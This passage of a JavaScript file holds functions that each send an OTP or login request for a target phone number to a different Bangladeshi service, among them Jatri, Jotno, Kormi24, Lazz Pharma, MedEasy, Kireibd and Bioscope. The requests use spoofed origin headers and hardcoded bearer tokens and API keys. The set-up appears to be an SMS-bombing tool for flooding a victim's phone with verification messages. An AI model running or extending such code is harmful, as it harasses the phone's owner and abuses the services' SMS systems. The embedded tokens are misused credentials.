      'authorization': 'Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjE4NDAyODQyIiwicHJvdmlkZXJfaWQiOiIxNzQ0ODczMjc4OTU2LWxRbk4ycFVncG5oaVFKdjFQS3BrWk1xemQ4eXBrSThqTjFZYUNOZk1Iek9YZnNRdThEYXB5ZVNGZ2hYTFI2Zk4iLCJyb2xlIjo0LCJ1c2VybmFtZSI6IndJOTg3SCIsInBsYXRmb3JtIjoiaXNjcmVlbiIsInBhcnRuZXIiOm51bGwsInN1YnNjcmliZSI6ZmFsc2UsInBhY2thZ2VJbmZvIjpudWxsLCJpc1RWT0QiOmZhbHNlLCJ0dm9kRXhwaXJlRGF0ZSI6IjE5NzAtMDEtMDEiLCJpYXQiOjE3NDQ4NzMyNzgsImV4cCI6MTc0NDk1OTY3OH0.Vzp1zAJHy-4BerczODIKbkOGEjHnOSiZzL2V0owWWul0JLQSySa5WiyZ22rZlhxSgFByk0SzvDCxtUJDyz2pOpOCD3KSBB8Foyga9Tv83gHnlYOWswyk-IYQnyPsoNYIIANP2ZSD0NkOTIOteuazXekwrT1nKW4PUxTl1bVOVPK1uoz6p2ezjf82ONKGOqieS57zxwRwKs6YEmHfilWf73BxPKR0d-oKsI5SK3pwGKW73u9pTkk_fKMtQgkaZHAHXEklMpbwXH3Mer3k0ZBuO5zonhUt2v-ucA2WW1HKm14EmtKab-vosvfKqEZl-fPhWMAin56FHsZ3CUjowEdiUJqqZhmdHao7GpUSrMg35PYOxKDF8ZOBczUoLPhVctzaqVieBT1iqG2sDWfDbRIUZVSuAm-3eeAobSF8IzdVY87erBz_i2aaHufOK8rZfDOqJNuO6Y6wX6GxpE9QWrViplVUvtLCnqj_Ph37lcHGNYcvU7XOjfwTtNVIpsE3aO1ny1PlccbJPrgvsBfPcbXGURQYZxTbUu8yKd_awEc3qBiPmVTXHuLwo3EBOQqlBSvxw6H0k0G2FwK02VfV4HOkUR2JXGvEkkxUrpAi0CGM7HmoXBuHX0MuqQioWPbdTy1p9vJwdStjTbk6MQJ8nxc8PdIK8VzJ4SXx8FqxT73bB-8',
      'origin': 'https://iscreen.com.bd',
      'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36'
    },
    body: data
  });

  if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
  return response.json();
}

async function callJatri(phone, signal) {
  const formattedPhone = phone.startsWith('+880') ? phone : `+880${phone}`;
  const url = 'https://user-api.jslglobal.co:444/v2/send-otp';
  const data = JSON.stringify({
    phone: formattedPhone,
    jatri_token: "J9vuqzxHyaWa3VaT66NsvmQdmUmwwrHj"
  });

  const response = await fetch(url, {
    method: 'POST',
    signal,
    headers: {
      'accept': 'application/json, text/plain, */*',
      'content-type': 'application/json',
      'origin': 'https://rental.jatri.co',
      'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36'
    },
    body: data
  });

  if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
  return response.json();
}

async function callJotno(phone, signal) {
  const url = 'https://gw.jotno.net/auth/login/token';
  const data = JSON.stringify({
    userType: 'CONSUMER',
    username: phone,
    apiKey: '03AFcWeA6Wc2mCNsrU3edOgxMdzzhI3loVfCHX96mvA6lJ2LKz8XLkMhI0d0L3vxmrv6BwWwk5Kn5rkaYBJGJH_8wWXvUV6ooHJU5UsJXEN7w38_5hd4G4-IVQgGFeDHGNLPQ0hxVCAMPKZjAY73kZKCKLwUyRdG1ld3I-r1O_aOvQbUelqjNjguZPGcc1QHqiyUPghVAxzm4kPLOVeBLGeX_wsaCFLc1jjXTsoMR3TQ3ybBnf0RCivKpmmzbhpYs0swgJr-F9ek-jUmdDMzLFk_8Ftn1HbQhBnocenNpVW3U63JFjAwN7dIc8p4ot3reqNcIut2tKmaqCmJXF_5-IlD8DX5BmLo9rbC1uw1HVIOMz0zHzxTCgzdPoG6O8ceNELYMuPkFJXJKj9cDKxVVZ5LCebg0IllKu601YqkQ2R7ru_9WtZw7iDuLAIEFXwCx-qxoMcu30cpnHsLny2rgXLgGJ-BrqQJljaXFTMMrX1c0t7atXxjlNl8rooS_A0E3uvw3YGmQGaR759m8ikqozf0ybEnUgEHqVcs6EAkYx2PdLFyFYv9sSSs3U-iqiXEYxbwc6uA9AERc0oZcPTsqQXe36WU3aZ2m00Q0XYisbhZd3POxZL0_7bBd8xpX7UFZokBX3HeTC6pYJR1HDzXTXDD3FEHkUvmhqyjwg-JAvU7vG7phJG6SeEy7cAY7ViGPP_Q-F6KKIpT0Cq0gje0QJHK2THaRt2BPQwxPgZHG7nCY5pSKnZhNtcwI0OIMFzywi4zFTphLPb3qEL_8MaD0mTj3JMugrSYA0OCEnPBW4iePKiUge_Ig6ttijKJ7y-EDV-xjV2Cq-MGpQgKvnSGHvc2T422oetPllKmwgKO50Md851ze8tUcu_kpO_Ap2Mr6rGo9v8FNYGrMpF4t3N8IRJhnbsjjrIuNOj-sC9M7cpq8IIKC8B1VIk9ruz4L59xAN-zueTNsA_s8WIzVneQDxtrLDiAho1CI419xHILFCFCEbsM_mBP-Hmq96c0fQTZzwggc_1q-p4CrjqAMdUltGE2r9JDwSnS22Gr84SmuzoVIV3BSqVm-kjWZJOV9_oaXMQxn2b9OR_y3r8NmujNq0IW36OATBqiDHRHJzhBni2aa8QVjGJ8JKxflySKlFw4b-9kwoL8Dg-Ndo59G4A-ge4Yt2YppQflIkutTLEdj1D-WJkNWVYtxF5b1y69CFsgKw9edMuQkP2CimATQHpftlR6ceYsVcaH2MOAtVfgO_d9mV5SfhC0yK-nOberzmLkXLimkLPnjgeN3iHRf7eLgwNZcCkQ-zDY78VPQ9ytg8aGUannG6IGu4nF-NlUaS28PK8x0JqUJL9FHcuEf1k9nJbsWZpO234_0WU8O0GgU9Aw7i8ki_krnuz-LRbNVnEm6VCuJLyGBLjmDW7WujHuAGixE-P1hKL0RrLwq0kNG9Pcb9_K33rF2a2OxFjdJNdSnU-XCBdouZVu0cvf3731xbxW3vN1QBXCB25-51xiwX-R1-4fy8KhBu9LLv0wWaWRse565SNk1wxYACf_FaQ-tilc3sSbsjbeHrnt3bwMLfj2gR-wxjP5kAqeahWqomdeloc8rWfh3RJiVKXdqCCs6eeygqRMtnaGks4JWKoNPMtMbRTzQy-x0CIMT1b8xEm6gkSrGtc5ajYecCD7MdZkMJfwfiWSLW9HW4bj9v6l7ze2FmWChaBeLc1emVeKzr0m7DKDcahXjzVI2UlrlsXwTbzD0wgjJuoyWvBm7hpfPCbDBnZthitPoFUMKQWAwOE5vnpurDuNmm0EJa28ErhsVYLQH58irspCvD9TasgptMZ9wZUa_35EIOOtU-HgAdNQilpzvulTrj3YEuEmQWV66R5igrNUPmw_zbX3W7N-IQxEy_WeJjV47Z9nwZk5ODvX_Hmuk9DNVry8kvECDSCf2xunsSeT3nsYQAONCKSJhT2x221D-fGqjMYT2eWetSNja1P6WaJAmdQ8Sfc--c4z0gp7akjv2EXXKfg7OCbDD07Hn4dDM2jQzSZGcFS0qhgmrCU0CMG0BapK8_'
  });

  const response = await fetch(url, {
    method: 'POST',
    signal,
    headers: {
      'accept': 'application/json, text/plain, */*',
      'content-type': 'application/json',
      'origin': 'https://jotno.net',
      'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',
      'x-request-source': 'web'
    },
    body: data
  });

  if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
  return response.json();
}

async function callKormi(phone, signal) {
  const url = 'https://api.kormi24.com/graphql';
  const data = JSON.stringify({
    operationName: "sendOTP",
    variables: {
      type: 1,
      mobile: phone,
      additional: JSON.stringify({
        user_agent: "web",
        mobile: phone
      }),
      hash: "97376f3b22c0c2c0cc3bd4730fbff57e805fd1a91c2e52c448644f90d768d433"
    },
    query: "mutation sendOTP($mobile: String!, $type: Int!, $additional: String, $hash: String!) { sendOTP(mobile: $mobile, type: $type, additional: $additional, hash: $hash) { status message __typename } }"
  });

  const response = await fetch(url, {
    method: 'POST',
    signal,
    headers: {
      'accept': '*/*',
      'content-type': 'application/json',
      'origin': 'https://www.kormi24.com',
      'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36'
    },
    body: data
  });

  if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
  return response.json();
}

async function callLaaz(phone, signal) {
  const url = 'https://www.lazzpharma.com/MessagingArea/OtpMessage/WebRegister';
  const data = JSON.stringify({
    ActivityId: '0b5510c9-c454-45e5-bd48-373c99492176',
    Phone: phone
  });

  const response = await fetch(url, {
    method: 'POST',
    signal,
    headers: {
      'accept': '*/*',
      'content-type': 'application/json',
      'origin': 'https://www.lazzpharma.com',
      'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36'
    },
    body: data
  });

  if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
  return response.json();
}

async function callMed(phone, signal) {
  const formattedPhone = phone.startsWith('+880') ? phone : `+880${phone}`;
  const url = `https://api.medeasy.health/api/send-otp/${formattedPhone}/`;

  const response = await fetch(url, {
    method: 'GET',
    signal,
    headers: {
      'accept': 'application/json',
      'origin': 'https://medeasy.health',
      'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36'
    }
  });

  if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
  return response.json();
}

async function callKire(phone, signal) {
  const url = 'https://app.kireibd.com/api/v2/send-signup-otp';
  const data = JSON.stringify({
    email: phone
  });

  const response = await fetch(url, {
    method: 'POST',
    signal,
    headers: {
      'accept': 'application/json',
      'content-type': 'application/json',
      'origin': 'https://kireibd.com',
      'x-xsrf-token': 'eyJpdiI6IldqYktiM2dOTnJkdEJ3NEtVRUpaK1E9PSIsInZhbHVlIjoiWFRiN0pBZjlmaXllc2EwZjZ1V2RFQmtzL3pHSy9PcnU5bGV2SnpLcjJQTjFlL29zUjlpOUY2dkR4eDZ0SUZuamRubXdXa1FIR0liUS8wb3pRR0dPV09iOTN5MEM3aWZBcGpRdjRpY3d0SUdLTUpQT05MaGFaK2l2ZkNzWkZDc1AiLCJtYWMiOiJiYmIyZDMxN2Q3NTBmM2ViY2E5YjY4OWM4ODE4OTc2Yjk2ZGNlYWZjZWVkNmQxMmMxNjI3NzM1ZDRjN2I1MjI5IiwidGFnIjoiIn0=',
      'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36'
    },
    body: data
  });

  if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
  return response.json();
}

// From bio.js
async function callBioscope(phone, signal) {
  // Sanitize: Only digits
  const sanitizedNumber = phone.replace(/\D/g, '');

  // Validate: Must be 11 digits and start with '01'
  if (sanitizedNumber.length === 11 && sanitizedNumber.startsWith('01')) {
    try {
      const response = await fetch(
        'https://api-dynamic.bioscopelive.com/v2/auth/login?country=BD&platform=web&language=en',
        {
          method: 'POST',
          signal,
          headers: {
            'accept': 'application/json',
            'accept-language': 'en-US,en-GB;q=0.9,en;q=0.8,bn;q=0.7',
            'authorization': '',
            'content-type': 'application/json',
            'origin': 'https://www.bioscopelive.com',
            'priority': 'u=1, i',
            'referer': 'https://www.bioscopelive.com/',
            'sec-ch-ua': '"Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',
          },
          body: JSON.stringify({ phone: '+88' + sanitizedNumber }),
        }
      );

      const data = await response.text(); // Use .text() if you want raw response
      return data;
    } catch (error) {
      throw new Error(`API request failed: ${error.message}`);
    }
  } else {
    throw new Error("Invalid number format. Use 11 digits starting with '01'.");
  }
}